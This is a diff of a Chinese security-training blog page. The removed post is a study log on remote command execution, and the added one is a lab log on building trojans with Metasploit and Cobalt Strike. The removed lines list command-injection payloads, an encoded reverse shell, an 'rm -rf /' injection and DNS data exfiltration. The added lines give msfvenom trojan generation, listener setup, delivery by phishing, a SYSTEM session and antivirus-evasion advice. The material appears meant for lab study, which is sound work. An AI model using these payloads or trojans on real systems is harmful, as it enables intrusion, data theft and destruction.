@@ -4,16 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="&#39;实训记录5&#39;, 计算机视觉、QRCODE">
-    <meta name="description" content="Web安全学习日志 - 第五天今日学习目标
-掌握RCE漏洞的原理与分类
-理解命令执行与代码执行的区别
-学习RCE攻击的Payload构造与利用
-熟悉反弹Shell的实现方法
-了解RCE漏洞的防御策略
-
-一、RCE漏洞核心概念1. 定义
-远程">
+    <meta name="keywords" content="&#39;实训记录6&#39;, 计算机视觉、QRCODE">
+    <meta name="description" content="渗透测试实验日志 - 计算机木马制作与利用实验环境
+攻击机：Kali Linux 2024.2（IP：192.168.1.100）
+受害机：Windows 11 22H2（IP：192.168.1.101）
+工具：Metasploit Fr">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -25,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>&#39;实训记录5&#39; | zoyager的博客</title>
+    <title>&#39;实训记录6&#39; | zoyager的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -333,12 +328,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">&#39;实训记录5&#39;</h1>
+                    <h1 class="description center-align post-title">&#39;实训记录6&#39;</h1>
                 </div>
             </div>
         </div>
@@ -374,21 +369,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-03-28
+                    2025-03-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-31
+                    2025-04-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    545
                 </div>
                 
 
@@ -413,139 +408,88 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Web安全学习日志-第五天"><a href="#Web安全学习日志-第五天" class="headerlink" title="Web安全学习日志 - 第五天"></a>Web安全学习日志 - 第五天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol>
-<li>掌握RCE漏洞的原理与分类</li>
-<li>理解命令执行与代码执行的区别</li>
-<li>学习RCE攻击的Payload构造与利用</li>
-<li>熟悉反弹Shell的实现方法</li>
-<li>了解RCE漏洞的防御策略</li>
-</ol>
-<h3 id="一、RCE漏洞核心概念"><a href="#一、RCE漏洞核心概念" class="headerlink" title="一、RCE漏洞核心概念"></a><strong>一、RCE漏洞核心概念</strong></h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h4><ul>
-<li><strong>远程命令执行（RCE）</strong>：攻击者通过网络远程执行目标服务器的系统命令。</li>
-<li><strong>远程代码执行（RCE）</strong>：攻击者远程执行目标服务器的任意代码（如PHP、Python）。</li>
+                <h1 id="渗透测试实验日志-计算机木马制作与利用"><a href="#渗透测试实验日志-计算机木马制作与利用" class="headerlink" title="渗透测试实验日志 - 计算机木马制作与利用"></a>渗透测试实验日志 - 计算机木马制作与利用</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a><strong>实验环境</strong></h2><ul>
+<li><strong>攻击机</strong>：Kali Linux 2024.2（IP：192.168.1.100）</li>
+<li><strong>受害机</strong>：Windows 11 22H2（IP：192.168.1.101）</li>
+<li><strong>工具</strong>：Metasploit Framework (MSF)、Cobalt Strike（备用）</li>
+<li><strong>网络</strong>：同一局域网（192.168.110.0&#x2F;24）</li>
 </ul>
-<h4 id="2-核心危害"><a href="#2-核心危害" class="headerlink" title="2. 核心危害"></a><strong>2. 核心危害</strong></h4><ul>
-<li><strong>权限控制</strong>：获取服务器管理员权限（Root&#x2F;Administrator）。</li>
-<li><strong>数据窃取</strong>：读取敏感文件（如数据库配置、用户密码）。</li>
-<li><strong>横向渗透</strong>：以内网服务器为跳板进一步攻击。</li>
-</ul>
-<h3 id="二、RCE漏洞原理与分类"><a href="#二、RCE漏洞原理与分类" class="headerlink" title="二、RCE漏洞原理与分类"></a><strong>二、RCE漏洞原理与分类</strong></h3><h4 id="1-漏洞成因"><a href="#1-漏洞成因" class="headerlink" title="1. 漏洞成因"></a><strong>1. 漏洞成因</strong></h4><ul>
-<li><strong>未过滤的用户输入</strong>：参数直接拼接到系统命令或代码执行函数中。</li>
-<li><strong>危险函数调用</strong>：使用<code>system()</code>、<code>exec()</code>、<code>eval()</code>等函数时未做安全校验。</li>
-</ul>
-<h4 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a><strong>2. 漏洞分类</strong></h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>触发条件</th>
-<th>示例语言</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>命令执行</strong></td>
-<td>用户输入拼接到<code>system()</code>、<code>shell_exec()</code>等系统命令函数</td>
-<td>PHP、Python</td>
-</tr>
-<tr>
-<td><strong>代码执行</strong></td>
-<td>用户输入拼接到<code>eval()</code>、<code>compile()</code>等代码执行函数</td>
-<td>PHP、Java</td>
-</tr>
-</tbody></table>
-<h4 id="3-操作系统差异"><a href="#3-操作系统差异" class="headerlink" title="3. 操作系统差异"></a><strong>3. 操作系统差异</strong></h4><table>
-<thead>
-<tr>
-<th>系统</th>
-<th>命令分隔符</th>
-<th>目录列表命令</th>
-<th>路径符号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Linux</td>
-<td><code>;</code>&#x2F;<code>&amp;</code></td>
-<td><code>ls</code></td>
-<td><code>/</code></td>
-</tr>
-<tr>
-<td>Windows</td>
-<td><code>&amp;</code>&#x2F;<code>&amp;&amp;</code></td>
-<td><code>dir</code></td>
-<td><code>\</code></td>
-</tr>
-</tbody></table>
-<h3 id="三、RCE攻击Payload构造"><a href="#三、RCE攻击Payload构造" class="headerlink" title="三、RCE攻击Payload构造"></a><strong>三、RCE攻击Payload构造</strong></h3><h4 id="1-基础Payload示例"><a href="#1-基础Payload示例" class="headerlink" title="1. 基础Payload示例"></a><strong>1. 基础Payload示例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">127.0.0.1; <span class="built_in">ls</span> /etc</span><br><span class="line">127.0.0.1 &amp; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">127.0.0.1&amp;<span class="built_in">dir</span> c:\</span><br><span class="line">127.0.0.1&amp;&amp;<span class="built_in">type</span> c:\boot.ini</span><br></pre></td></tr></table></figure>
+<h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a><strong>实验目标</strong></h2><p>通过 Metasploit 生成远控木马并实现对 Windows 主机的远程控制。</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="1-启动-Metasploit-控制台"><a href="#1-启动-Metasploit-控制台" class="headerlink" title="1. 启动 Metasploit 控制台"></a><strong>1. 启动 Metasploit 控制台</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终端窗口1</span></span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-高级绕过技巧"><a href="#2-高级绕过技巧" class="headerlink" title="2. 高级绕过技巧"></a><strong>2. 高级绕过技巧</strong></h4><table>
-<thead>
-<tr>
-<th>方法</th>
-<th>示例 Payload</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>编码绕过</strong></td>
-<td>&#96;127.0.0.1; echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx’</td>
-<td>Base64 编码反弹 Shell 命令</td>
-</tr>
-<tr>
-<td><strong>符号绕过</strong></td>
-<td><code>127.0.0.1$&#123;IFS&#125;&amp;&amp;$&#123;IFS&#125;ls</code></td>
-<td>使用 IFS 环境变量绕过空格</td>
-</tr>
-<tr>
-<td><strong>条件竞争</strong></td>
-<td><code>127.0.0.1; sleep 10; rm -rf /</code></td>
-<td>延时执行破坏性命令</td>
-</tr>
-</tbody></table>
-<h4 id="3-反弹-Shell"><a href="#3-反弹-Shell" class="headerlink" title="3. 反弹 Shell"></a><strong>3. 反弹 Shell</strong></h4><h3 id="四、RCE-漏洞利用场景"><a href="#四、RCE-漏洞利用场景" class="headerlink" title="四、RCE 漏洞利用场景"></a><strong>四、RCE 漏洞利用场景</strong></h3><h4 id="1-结合其他漏洞"><a href="#1-结合其他漏洞" class="headerlink" title="1. 结合其他漏洞"></a><strong>1. 结合其他漏洞</strong></h4><ul>
-<li><strong>文件上传漏洞</strong>：上传 Webshell 后通过 RCE 执行系统命令。</li>
-<li><strong>SSRF 漏洞</strong>：利用 RCE 触发内网服务探测（如 Redis 未授权访问）。</li>
+<h3 id="2-生成-Windows-木马"><a href="#2-生成-Windows-木马" class="headerlink" title="2. 生成 Windows 木马"></a><strong>2. 生成 Windows 木马</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终端窗口2</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp \</span><br><span class="line">LHOST=192.168.1.100 \</span><br><span class="line">LPORT=4444 \</span><br><span class="line">-f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>参数说明<ul>
+<li><code>p</code>: 指定 payload 类型（反向 TCP 连接）</li>
+<li><code>LHOST</code>: Kali 攻击机 IP</li>
+<li><code>LPORT</code>: 监听端口（需开放）</li>
+<li><code>f</code>: 输出格式（exe）</li>
+<li><code>o</code>: 输出文件名</li>
 </ul>
-<h4 id="2-无回显-RCE-利用"><a href="#2-无回显-RCE-利用" class="headerlink" title="2. 无回显 RCE 利用"></a><strong>2. 无回显 RCE 利用</strong></h4><ul>
-<li><strong>外带数据</strong>：通过 DNS 查询泄露数据（如<code>nslookup $(whoami).yourdomain.com</code>）。</li>
-<li><strong>文件写入</strong>：将结果写入可访问的文件（如<code>echo $(id) &gt; /var/www/html/output.txt</code>）。</li>
+</li>
 </ul>
-<h3 id="五、工具与实战"><a href="#五、工具与实战" class="headerlink" title="五、工具与实战"></a><strong>五、工具与实战</strong></h3><h4 id="1-漏洞利用工具"><a href="#1-漏洞利用工具" class="headerlink" title="1. 漏洞利用工具"></a><strong>1. 漏洞利用工具</strong></h4><ul>
-<li><strong>Metasploit</strong>：集成多个 RCE 漏洞模块（如<code>exploit/multi/http/tomcat_jsp_upload</code>）。</li>
-<li><strong>蚁剑</strong>：支持 RCE 漏洞生成与 Shell 管理。</li>
-<li><strong>Burp Suite</strong>：抓包分析并构造 Payload。</li>
+<h3 id="3-设置监听模块"><a href="#3-设置监听模块" class="headerlink" title="3. 设置监听模块"></a><strong>3. 设置监听模块</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终端窗口1（msfconsole）</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit -j  <span class="comment"># -j 表示后台运行</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-传播并执行木马"><a href="#4-传播并执行木马" class="headerlink" title="4. 传播并执行木马"></a><strong>4. 传播并执行木马</strong></h3><ol>
+<li><p>将生成的 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload.exe</span><br></pre></td></tr></table></figure>
+
+<p> 通过以下方式传输至受害机：</p>
+<ul>
+<li>共享文件夹</li>
+<li>伪装成文档 &#x2F; 图片（需社会工程学）</li>
+<li>钓鱼邮件附件</li>
 </ul>
-<h4 id="2-靶场推荐"><a href="#2-靶场推荐" class="headerlink" title="2. 靶场推荐"></a><strong>2. 靶场推荐</strong></h4><ul>
-<li><strong>Vulhub</strong>：RCE 漏洞专项靶场（如<code>vulhub/php/thinkphp_rce</code>）。</li>
-<li><strong>DVWA</strong>：高难度 RCE 模块（需手动构造 Payload）。</li>
+</li>
+<li><p>在受害机上双击运行 <code>payload.exe</code>。</p>
+</li>
+</ol>
+<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a><strong>实验结果</strong></h2><ul>
+<li>成功标志<ul>
+<li>msfconsole 显示 Meterpreter 会话建立</li>
+<li>可执行命令（如 <code>shell</code>, <code>getsystem</code>, <code>upload/download</code>）</li>
 </ul>
-<h3 id="六、防御策略"><a href="#六、防御策略" class="headerlink" title="六、防御策略"></a><strong>六、防御策略</strong></h3><h4 id="1-代码层防御"><a href="#1-代码层防御" class="headerlink" title="1. 代码层防御"></a><strong>1. 代码层防御</strong></h4><ul>
-<li><strong>禁用危险函数</strong>：避免使用<code>system()</code>、<code>eval()</code>等函数。</li>
-<li><strong>输入过滤</strong>：使用白名单校验输入内容（如仅允许数字、字母）。</li>
-<li><strong>参数化查询</strong>：对数据库操作使用预编译语句。</li>
+</li>
 </ul>
-<h4 id="2-系统层防御"><a href="#2-系统层防御" class="headerlink" title="2. 系统层防御"></a><strong>2. 系统层防御</strong></h4><ul>
-<li><strong>最小权限原则</strong>：限制 Web 服务用户权限（如禁止执行<code>rm</code>命令）。</li>
-<li><strong>安装 WAF</strong>：部署 Web 应用防火墙（如 ModSecurity）。</li>
-<li><strong>及时更新补丁</strong>：修复已知 RCE 漏洞（如 Log4j 2.x 漏洞）。</li>
-</ul>
-<h3 id="七、总结与明日计划"><a href="#七、总结与明日计划" class="headerlink" title="七、总结与明日计划"></a><strong>七、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul>
-<li>RCE 漏洞的原理与分类</li>
-<li>Payload 构造与反弹 Shell 实现</li>
-<li>结合其他漏洞的利用方法</li>
-</ul>
-<h1 id="漏洞利用及RCE漏洞"><a href="#漏洞利用及RCE漏洞" class="headerlink" title="漏洞利用及RCE漏洞"></a>漏洞利用及RCE漏洞</h1><p>能够获取一些边界服务器当跳板机来进入网络环境</p>
-<h2 id="获取边界服务器的权限"><a href="#获取边界服务器的权限" class="headerlink" title="获取边界服务器的权限"></a>获取边界服务器的权限</h2><h3 id="通过web漏洞去获取权限（入侵类-逻辑类）"><a href="#通过web漏洞去获取权限（入侵类-逻辑类）" class="headerlink" title="通过web漏洞去获取权限（入侵类 逻辑类）"></a>通过web漏洞去获取权限（入侵类 逻辑类）</h3><p>文件上传 rce sql注入 ssrf</p>
-<p>0day 没有公开 厂商也没有打补丁的漏洞</p>
-<p>1day 没有公开 厂商打了补丁</p>
-<p>nday 公开 厂商打了漏洞</p>
-<h3 id="通过钓鱼获取"><a href="#通过钓鱼获取" class="headerlink" title="通过钓鱼获取"></a>通过钓鱼获取</h3><p>近源渗透  wifi渗透 sslvpn凭证 社会工程学</p>
-<h2 id="RCE漏洞（远程代码执行漏洞）"><a href="#RCE漏洞（远程代码执行漏洞）" class="headerlink" title="RCE漏洞（远程代码执行漏洞）"></a>RCE漏洞（远程代码执行漏洞）</h2><p>黑客可以在你的电脑上执行命令-&gt;电脑被控制</p>
-<p>渗透测试工程师-&gt;士兵</p>
-<p>漏洞及漏洞利用工具-&gt;武器</p>
-<p>安全开发工程师-&gt;造武器的</p>
-<p>安全研究员-&gt;挖漏洞的</p>
-<p>命令执行函数：shell_exec(),拼接漏洞</p>
-<p>漏洞原理：用户输入的参数没有进行严格的过滤，参数直接拼接到后端代码</p>
-<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250331101703059.png" alt="image-20250331101702998"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.101</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.100:4444 -&gt; 192.168.1.101:52345) at 2025-04-02 14:30:00 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h2><ol>
+<li><strong>网络连通性</strong>：攻击机与受害机需处于同一局域网</li>
+<li><strong>端口开放</strong>：确保 <code>4444</code> 端口未被防火墙拦截</li>
+<li><strong>权限提升</strong>：若未获取 SYSTEM 权限，可尝试 <code>getsystem</code> 命令</li>
+<li><strong>隐蔽性</strong>：建议对木马文件进行免杀处理（如使用 <code>veil-evasion</code>）</li>
+</ol>
+<h1 id="实操msf木马"><a href="#实操msf木马" class="headerlink" title="实操msf木马"></a>实操msf木马</h1><p>首先安装kali，利用msf生成一个木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.110</span><span class="number">.155</span> LPORT=<span class="number">4444</span> -f exe -o <span class="number">1234.</span>exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402142558381.png" alt="image-20250402142551304"></p>
+<p>开启监听功能</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.110</span><span class="number">.155</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402143433252.png" alt="image-20250402143433195"></p>
+<p>从虚拟机点击病毒</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402143808265.png" alt="image-20250402143807952"></p>
+<p>shell弹计算器了！！！</p>
+<h1 id="实操CS木马"><a href="#实操CS木马" class="headerlink" title="实操CS木马"></a>实操CS木马</h1><p>首先解压cs文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402144350438.png" alt="image-20250402144350408"></p>
+<p>为文件夹赋予权限</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd -R *</span><br></pre></td></tr></table></figure>
+
+<p>在kali打开服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402144507068.png" alt="image-20250402144507033"></p>
+<p>在客户端进行设置</p>
+<p>首先进行连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402144554553.png" alt="image-20250402144554532"></p>
+<p>生成木马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402145616625.png" alt="image-20250402145616595"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402145648698.png" alt="image-20250402145648669"></p>
+<p>点击运行，并进行监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250402145733605.png" alt="image-20250402145733528"></p>
 
                 
             </div>
@@ -572,7 +516,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://zoyager.github.io/2025/03/28/shi-xun-ji-lu-5/">https://zoyager.github.io/2025/03/28/shi-xun-ji-lu-5/</a>
+                    <a href="https://zoyager.github.io/2025/03/31/shi-xun-ji-lu-6/">https://zoyager.github.io/2025/03/31/shi-xun-ji-lu-6/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -686,9 +630,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/03/31/shi-xun-ji-lu-6/">
                     <div class="card-image">
@@ -706,9 +651,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -717,6 +662,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -727,13 +673,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/03/27/shi-xun-ji-lu-4/">
+                <a href="/2025/03/28/shi-xun-ji-lu-5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="&#39;实训记录4&#39;">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="&#39;实训记录5&#39;">
                         
-                        <span class="card-title">&#39;实训记录4&#39;</span>
+                        <span class="card-title">&#39;实训记录5&#39;</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -744,7 +690,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-28
                             </span>
                         <span class="publish-author">
                             
